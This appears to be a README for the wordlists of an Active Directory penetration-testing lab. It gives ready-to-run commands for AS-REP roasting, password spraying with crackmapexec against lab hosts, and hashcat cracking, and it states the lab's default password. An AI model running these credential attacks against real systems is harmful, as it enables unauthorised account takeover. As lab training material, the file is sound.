# Wordlists

## lab-users.txt

All lab user accounts (corp.local + dev.corp.local).

Use for:
- AS-REP Roasting without credentials: `GetNPUsers.py corp.local/ -usersfile lab-users.txt -no-pass`
- Password spraying: `crackmapexec smb 192.168.56.10 -u lab-users.txt -p p@ssw0rd`
- BloodHound username enumeration

## lab-passwords.txt

Common weak passwords to use in password spray attacks.

All lab accounts use `p@ssw0rd` by default.

Use for:
- Password spraying: `crackmapexec smb 192.168.56.0/24 -u lab-users.txt -p lab-passwords.txt`
- Hashcat rules: `hashcat -m 1000 hashes.txt lab-passwords.txt -r /usr/share/hashcat/rules/best64.rule`

## Adding rockyou.txt

For realistic cracking, download rockyou.txt:

```bash
# Kali Linux
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Download
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```
